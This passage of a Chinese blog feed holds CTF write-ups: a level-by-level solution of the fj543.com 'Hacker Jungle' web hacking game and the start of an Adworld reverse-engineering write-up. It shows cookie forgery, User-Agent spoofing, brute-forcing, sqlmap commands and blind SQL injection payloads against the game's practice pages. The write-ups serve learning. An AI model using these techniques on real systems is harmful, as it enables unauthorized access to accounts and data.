    <title>黑客丛林之旅小游戏</title>
    <link href="http://example.com/posts/9589547b.html"/>
    <id>http://example.com/posts/9589547b.html</id>
    <published>2022-04-05T01:29:28.302Z</published>
    <updated>2022-04-11T05:25:37.153Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://www.fj543.com/hack/">黑客丛林之旅</a></p><p>1-<a href="http://www.fj543.com/hack/?level=1">http://www.fj543.com/hack/?level=1</a></p><blockquote><p>提示语：在浏览器端用脚本进行身份验证是很容易被破解的。(The Client-side authentication is not secure) </p></blockquote><span id="more"></span><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">gogogo</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> pwd=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;pass&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span> (pwd==<span class="string">&quot;go8990&quot;</span>) &#123;<span class="title function_">alert</span>(<span class="string">&quot;OK,过关了！&quot;</span>);<span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;./?level=222&quot;</span>;&#125; <span class="keyword">else</span> &#123;<span class="title function_">alert</span>(<span class="string">&quot;Error:密码错误！&quot;</span>);<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;pass&quot;</span>).<span class="title function_">focus</span>();&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2-<a href="http://www.fj543.com/hack/?level=222">http://www.fj543.com/hack/?level=222</a></p><blockquote><p>提示语：这讨厌的脚本，为什么阻止我！(I hate the script,it prevents me) </p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">chkPassword</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> pwd=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;pass&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">if</span> (pwd==<span class="string">&quot;&quot;</span>) &#123;<span class="title function_">alert</span>(<span class="string">&quot;Error:密码不能为空！(Input password please)&quot;</span>);&#125;<span class="keyword">else</span>&#123;<span class="title function_">alert</span>(<span class="string">&quot;Error:密码不能填东西！(Don&#x27;t input password please)&quot;</span>);&#125; <span class="comment">//无论输入什么内容,就是不让你提交！</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;./&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return chkPassword()&quot;</span>&gt;</span></span><br><span class="line">输入密码进入下一关 (Input password please)<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pass&quot;</span> <span class="attr">id</span>=<span class="string">&quot;pass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;act&quot;</span> <span class="attr">id</span>=<span class="string">&quot;act&quot;</span> <span class="attr">value</span>=<span class="string">&quot;pass2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Go&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>script标签里的东西改不了，将表单的<code>return chkPassword()</code>删掉即可。</p><p>3-<a href="http://www.fj543.com/hack/?level=3login">http://www.fj543.com/hack/?level=3login</a></p><blockquote><p>您还没有登录，所以看不到本页的秘密。(You must login to see the secret of this level) </p><p>提示语：这该死的网页，凭什么说我没有登录？(Damn page! Why you say that I didn’t login?)  </p></blockquote><p>在cookie管理器或抓包改cookie，no改成yes即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: ASPSESSIONIDCSSDDSRA=KDLFDAJCJMFKCDDFPJOBMEFA; Hm_lvt_ddc172cd878cb9d6da5a109ab508be16=1631447102; Hm_lpvt_ddc172cd878cb9d6da5a109ab508be16=1631447282; guoguan=2; login=no</span><br></pre></td></tr></table></figure><p>4-<a href="http://www.fj543.com/hack/?level=4ditdah">http://www.fj543.com/hack/?level=4ditdah</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">. .</span><br><span class="line">. _</span><br><span class="line">_ _</span><br><span class="line">_ _ _</span><br><span class="line">_ . _</span><br><span class="line">提示语：向嘀嗒嘀嗒的电子时代老一辈黑客们致敬。(Tribute to the early hackers)  </span><br></pre></td></tr></table></figure><p> 摩斯电码<code>IAMOK</code></p><p>5-<a href="http://www.fj543.com/hack/?level=5crack">http://www.fj543.com/hack/?level=5crack</a></p><blockquote><p>提示语：用流行的加密算法把密码加密成YmFzZTY0aXNvaw==或ad93c1d102ae60f4的形式并不可靠。(Encrypting a password by a popular encryption method is not secure)  </p></blockquote><p><code>YmFzZTY0aXNvaw==</code>有大小写和等号，考虑base64<code>base64isok</code></p><p><code>ad93c1d102ae60f4</code>是MD5<code>520530</code>，但用<code>520530</code>过不了关？？？</p><p>6-<a href="http://www.fj543.com/hack/?level=6por">http://www.fj543.com/hack/?level=6por</a></p><blockquote><p> if mstsc+vnc=9290 then password=MSSQL+MySQL+Oracle<br> password= ？</p><p> 提示语：有些常见的数字要记住。(You should remember some numbers)  </p></blockquote><p>常见端口号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mstsc:3389</span><br><span class="line">vnc:5901</span><br><span class="line">MSSQL:1433</span><br><span class="line">MySQL:3306</span><br><span class="line">Oeacle:1521</span><br></pre></td></tr></table></figure><p>password=1433+3306+1521=6260</p><p>7-<a href="http://www.fj543.com/hack/?level=75901">http://www.fj543.com/hack/?level=75901</a></p><blockquote><p>提示语：眼花缭乱了吧，看电视的时候怎么不会啊！(The password is about a TV program)  </p></blockquote><p>一张GIF动图，拿去<code>Stegsolve</code>把它拆了analyse-&gt;frame browser，拆成6张图，组合起来为<code>8bIGNOREwmUPPERCASEqneWORDS</code>，大写字母的意思是<code>ignore upper words</code>忽略大写字母，所以正确答案为<code>8bwmqne</code>。</p><p>8-<a href="http://www.fj543.com/hack/?level=8bwmqne">http://www.fj543.com/hack/?level=8bwmqne</a></p><blockquote><p>吴世昌的弟弟的网名是什么？(What’s the username of WuShichang’s little brother) </p><p>提示语：小小社工，过这一关主要靠人脑，电脑只是辅助。(Social Engineering.Use your brain more,and use computer less) </p></blockquote><p>吴世昌的弟弟叫吴其昌，吴世昌的网名fj543，推测吴其昌的网名为<code>fj573</code></p><p>9-<a href="http://www.fj543.com/hack/?level=91ie543">http://www.fj543.com/hack/?level=91ie543</a></p><blockquote><p>提示语：使用IE 5.43版本的浏览器访问?level=9token可以得到令牌。(Use IE 5.43 version to browse ?level=9token) </p></blockquote><p>抓包改URL和浏览器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /hack/?level=91ie543 HTTP/1.1</span><br><span class="line">Host: www.fj543.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /hack/?level=9token HTTP/1.1</span><br><span class="line">Host: www.fj543.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 IE 5.43</span><br></pre></td></tr></table></figure><p><code>您的令牌(Token):level9495216</code></p><p>回到原来的URL输入令牌。</p><p>10-<a href="http://www.fj543.com/hack/?level=g1012495216">http://www.fj543.com/hack/?level=g1012495216</a></p><blockquote><p>提示语：请下载<a href="http://www.fj543.com/hack/files/10token.zip">令牌生成器(Token Generator)</a>。解压密码不长,但很复杂。(Download it.The zip password is short,but very complex)  </p></blockquote><p>去winhex查一下是不是真加密，真加密就爆破zip，结果为<code>o0_O</code>。输入密码，执行exe程序生成口令。但当我们点击<code>aux.10.txt</code>后它说找不到文件，用什么文字编辑器都打不开。wp说它属于特殊文件名，只能用cmd打开：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#type指令打开常规方法无法打开的文件</span><br><span class="line">type \\.[txt文件的绝对路径]</span><br><span class="line">type \\.\C:\Users\dell\Desktop\10token\aux.10.txt</span><br><span class="line">你的令牌(Token):key104957591</span><br><span class="line">只在今天有效(It&#x27;s available only today)</span><br></pre></td></tr></table></figure><p>11-<a href="http://www.fj543.com/hack/?level=lv11">http://www.fj543.com/hack/?level=lv11</a></p><blockquote><p>提示语：一个表情，却是有声有色。(I like the beautiful face and the voice) </p></blockquote><p>用winhex打开看到字符串</p><blockquote><p>GIF89a……——————————password end,and password start——————————RIFF$WAVEfmt</p></blockquote><p>前面是GIF图片，后面RIFF$WAVEfmt是音频文件格式。用winhex将前面的GIF部分删除，剩下的另存为.wav文件，音频说<code>表情加上6688</code>，我的是微笑表情，所以<code>smile6688</code>通过。</p><p>12-<a href="http://www.fj543.com/hack/?level=g1213495759">http://www.fj543.com/hack/?level=g1213495759</a></p><blockquote><p>您需要获取两个临时ID的认证，才能看到本关的秘密！(You should get two Authentication)<br>1.下载第12关认证软件，用它申请认证一个软件临时ID.(Download it. And use it to Authenticate the TempID of software)<br>2.回到此窗口，想办法手工申请认证你的网页临时ID.(Then back to this window.Try to Authenticate the TempID of web)</p><p>提示语：你的网页临时ID是191.半小时内有效，若失效请刷新网页。(This is your TempID of web) </p></blockquote><p>下载解压后win10一定一定要以管理员身份运行，否则根本打不开！</p><blockquote><p>临时ID：455</p><p>在线认证开始(Started)</p><p>验证第一步(step1)…Step1 ok</p><p>验证第二步(step2)…Step2 ok</p><p>已完成软件临时ID的认证。接下来请回到浏览器中申请网页临时ID的认证。(Software TempID is authenticated.Please back to the browser window.Try to Authenticate the TempID of web)</p></blockquote><p>什么都没有，就给了个临时ID，先用winhex打开看看</p><blockquote><p>User-Agent: Mozilla/4.0 (compatible; HackersGameBrowser)</p><p><a href="http://www.fj543.com/hack/">http://www.fj543.com/hack/</a>  寶翄,{Nek(step1)  ?act=step1&amp;code=  寶翄,{孨ek(step2)  ?act=step2&amp;code=  step1ok step2ok</p></blockquote><p>可以看到关键信息<code>?act=step1&amp;code=</code>和<code>?act=step2&amp;code=</code>，提交链接应该就是这些。</p><p>先把刚才的软件临时ID构造<code>http://www.fj543.com/hack/?act=step1&amp;code=455</code>，但会出现以下错误：</p><blockquote><p>Error:你的临时ID应该是162.(Your TempID should be this one) </p></blockquote><p>抓包把User-Agent换成上面那个就可以了。</p><blockquote><p> Step1 ok </p></blockquote><p>接下来获取第二个临时ID，猜测<code>http://www.fj543.com/hack/?act=step2&amp;code=455</code>显示</p><blockquote><p> Error:Bad Code </p></blockquote><p>现在已知code总是3位数，那就直接爆破。有些code都返回了<code>Step2 ok</code>但怎么进去下一关啊？感觉是bug。找到状态302，就是正确code，在URL上打就刷新出第13关入口。</p><p>13-<a href="http://www.fj543.com/hack/?level=13sql">http://www.fj543.com/hack/?level=13sql</a></p><blockquote><p>你的ID是(Your ID)： 154<br>你的密码(Your password)： </p><p>提示语：请从/hack/13sql.asp挖掘出这个ID对应的密码。(Try to find the password for the ID)  </p></blockquote><p>去到<a href="http://www.fj543.com/hack/13sql.asp">http://www.fj543.com/hack/13sql.asp</a></p><blockquote><p>这是一个数据库信息查证页面，提交一个ID，会显示查询结果。(Submit an ID,then it will show you the query result)</p><p>数据库中有这条信息,但我不能直接告诉你密码。(The data exists.But I can’t show you the password)  </p></blockquote><p>POST形式的SQL注入，也可以用sqlmap自动化注入，参数可以抓包看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://www.fj543.com/hack/13sql.asp --data=&quot;id=154&amp;password=111&quot; --batch</span><br><span class="line">sqlmap -u http://www.fj543.com/hack/13sql.asp --data=&quot;id=154&amp;password=111&quot; --batch --tables</span><br></pre></td></tr></table></figure><p>自动化注入好像不行，开始手注。</p><p>输入1</p><blockquote><p> 数据库中有这条信息,但我不能直接告诉你密码。 </p></blockquote><p>输入1 and 1=1</p><blockquote><p> 数据库中有这条信息,但我不能直接告诉你密码。 </p></blockquote><p>输入-1</p><blockquote><p> 没有找到此ID对应的内容。 </p></blockquote><p>输入-1 or 1=1</p><blockquote><p> 数据库中有这条信息,但我不能直接告诉你密码。 </p></blockquote><p>反正就不告诉我，普通手注从网页中返回不了有效信息，大佬们wp中的思路：猜密码的字段名为pwd，构造<code>154 and pwd like &#39;%a%&#39;</code>，抓包，将$a$暴力破解。我猜意思是pwd是由暴力破解得出的字符组成的。</p><blockquote><p>id=154+and+pwd+like+%27%25a%25%27</p><p>id=154+and+pwd+like+%27%25$a$%25%27</p></blockquote><p>破解发现<code>bdguvBDGUV</code>都有，我猜密码是5个字符，不区分大小写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;bdguv.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(<span class="string">&#x27;bdguv&#x27;</span>, <span class="number">5</span>):</span><br><span class="line">    c = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    f.write(c+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>回到<code>http://www.fj543.com/hack/?level=13sql</code>抓包，设置参数用bdguv.txt爆破。返回状态302的即是正确密码。</p><p>14-<a href="http://www.fj543.com/hack/?level=14crack">http://www.fj543.com/hack/?level=14crack</a></p><p>令牌下载下来的名字<code>file.exe.html</code>，将html删去，运行一下，让我们输入密码。扔去OD看看字符串：右键-&gt;中文搜索引擎-&gt;智能搜索</p><p>可以看到一些奇怪的字符串，组合起来为<code>love543</code>，估计这个就是密码，输入就可得到令牌。</p><p>通关。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;http://www.fj543.com/hack/&quot;&gt;黑客丛林之旅&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;1-&lt;a href=&quot;http://www.fj543.com/hack/?level=1&quot;&gt;http://www.fj543.com/hack/?level=1&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;提示语：在浏览器端用脚本进行身份验证是很容易被破解的。(The Client-side authentication is not secure) &lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="综合" scheme="http://example.com/categories/%E7%BB%BC%E5%90%88/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界 逆向高手进阶区</title>
    <link href="http://example.com/posts/5a99a36.html"/>
    <id>http://example.com/posts/5a99a36.html</id>
    <published>2022-04-05T01:29:28.272Z</published>
    <updated>2022-04-11T05:25:29.836Z</updated>
    
    <content type="html"><![CDATA[<p>新手练习区完结，高手进阶区有些也做过了。如果在这里找不到笔记，请到<a href="https://blog.csdn.net/Leong_Vinson">小凉的CSDN博客</a>去找，如果没有那就真没有了。</p><span id="more"></span><h1 id="1-secret-string-400"><a href="#1-secret-string-400" class="headerlink" title="1. secret-string-400"></a>1. secret-string-400</h1><p>下载下来是个<code>.gz</code>文件，拖进kali解压，发现又是一个压缩文件，继续解压。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">                    </span><br><span class="line">┌──(v5le0n9㉿kali)-[~/Desktop]</span><br><span class="line">└─$ gzip -d secret.gz  </span><br><span class="line">                                                                             </span><br><span class="line">┌──(v5le0n9㉿kali)-[~/Desktop]</span><br><span class="line">└─$ file secret</span><br><span class="line">secret: POSIX tar archive</span><br><span class="line">                                                                             </span><br><span class="line">┌──(v5le0n9㉿kali)-[~/Desktop]</span><br><span class="line">└─$ tar -xvf secret</span><br><span class="line">./._Task.html</span><br><span class="line">Task.html</span><br><span class="line">./._Machine.js</span><br><span class="line">Machine.js</span><br></pre></td></tr></table></figure><p>解压出来一个html文件和一个js文件。打开html文件输入字符串试试，啥都没有。要我们输入一个无效字符串才可以得到flag。</p><img src="/posts/5a99a36/1.1.png" class="" title="输入字符串"><p>打开js分析check()函数。</p><img src="/posts/5a99a36/1.2.png" class="" title="js代码"><p>loadcode()用来加载aardio代码，或一个aardio代码文件，并创建一个函数对象。函数原型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数对象,错误信息 = loadcode(codeString | filepath)</span><br></pre></td></tr></table></figure><p>参数可以是包含aardio代码的字符串值，也可以是aardio代码文件的路径。路径可以用斜杠作为首字符表示应用程序根目录。该函数并不立即执行代码，而是返回一个函数对象。如果加载代码失败，则返回的函数对象为null值，并在第二个返回值中返回错误信息。</p><p>所以那些数字其实是aardio代码。先去到run函数看看。</p><img src="/posts/5a99a36/1.3.png" class="" title="js代码"><img src="/posts/5a99a36/1.4.png" class="" title="js代码"><p>救…js我实在不会啊！看了牛牛们的wp，通过修改js文件将命令参数打印在Console中。在run函数中加入代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;new Opcode&#x27;</span> + command.<span class="property">args</span>)</span><br></pre></td></tr></table></figure><img src="/posts/5a99a36/1.5.png" class="" title="js代码"><p>运行一下，在Console中就可以看到被解析出来的代码了。</p><img src="/posts/5a99a36/1.6.png" class="" title="console"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f=<span class="variable language_">window</span>.<span class="property">machine</span>.<span class="property">registers</span>[<span class="number">1</span>].<span class="property">userinput</span><span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> i = f.<span class="property">length</span><span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> nonce = <span class="string">&#x27;groke&#x27;</span>;<span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> j = <span class="number">0</span>;<span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> out = [];<span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> eq = <span class="literal">true</span>;<span class="comment">//</span></span><br><span class="line"><span class="keyword">while</span>(j &lt; i)&#123;<span class="comment">//</span></span><br><span class="line">out.<span class="title function_">push</span>(f.<span class="title function_">charCodeAt</span>(j) ^ nonce.<span class="title function_">charCodeAt</span>(j%<span class="number">5</span>))<span class="comment">//</span></span><br><span class="line">j++;<span class="comment">//</span></span><br><span class="line">&#125;<span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> ex =  [<span class="number">1</span>, <span class="number">30</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">69</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">85</span>, <span class="number">75</span>, <span class="number">50</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">48</span>, <span class="number">24</span>, <span class="number">10</span>, <span class="number">56</span>, <span class="number">55</span>, <span class="number">46</span>, <span class="number">56</span>, <span class="number">60</span>];<span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span> (ex.<span class="property">length</span> == out.<span class="property">length</span>) &#123;<span class="comment">//</span></span><br><span class="line">j = <span class="number">0</span>;<span class="comment">//</span></span><br><span class="line"><span class="keyword">while</span>(j &lt; ex.<span class="property">length</span>)&#123;<span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span>(ex[j] != out[j])<span class="comment">//</span></span><br><span class="line">eq = <span class="literal">false</span>;<span class="comment">//</span></span><br><span class="line">j += <span class="number">1</span>;<span class="comment">//</span></span><br><span class="line">&#125;<span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span>(eq)&#123;<span class="comment">//</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;YOU WIN!&#x27;</span>);<span class="comment">//</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;NOPE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;<span class="title function_">alert</span>(<span class="string">&#x27;NOPE!&#x27;</span>);&#125;<span class="comment">//</span></span><br></pre></td></tr></table></figure><p>这些代码我就看懂了。输入的长度与ex长度要相等，经过异或算法最终要与ex中的元素相等。马上编写逆向脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ex =  [<span class="number">1</span>, <span class="number">30</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">69</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">85</span>, <span class="number">75</span>, <span class="number">50</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">48</span>, <span class="number">24</span>, <span class="number">10</span>, <span class="number">56</span>, <span class="number">55</span>, <span class="number">46</span>, <span class="number">56</span>, <span class="number">60</span>]</span><br><span class="line">nonce = <span class="built_in">list</span>(<span class="string">&#x27;groke&#x27;</span>)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ex)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(ex[i] ^ <span class="built_in">ord</span>(nonce[i%<span class="number">5</span>]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag is: WOW_so_EASY</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WOW_so_EASY</span><br></pre></td></tr></table></figure><p>原来这就是Web逆向嘛，呜呜呜呜js硬伤啊</p><h1 id="2-Newbie-calculations"><a href="#2-Newbie-calculations" class="headerlink" title="2. Newbie_calculations"></a>2. Newbie_calculations</h1><p>运行一下，发现输入不了任何东西。载入OD，发现每隔一段时间暂停一下它会停在不同的地址，说明这个程序一直在运行，而不是等待我们输入。</p><p>载入IDA查看伪代码，发现它在不停地调用这几个函数。</p><img src="/posts/5a99a36/2.1.png" class="" title="IDA分析"><p>一个个进去看，反编译乱死了…</p><img src="/posts/5a99a36/2.2.png" class="" title="IDA分析"><img src="/posts/5a99a36/2.3.png" class="" title="IDA分析"><img src="/posts/5a99a36/2.4.png" class="" title="IDA分析"><p>知道每个函数的作用后，抄一遍代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span 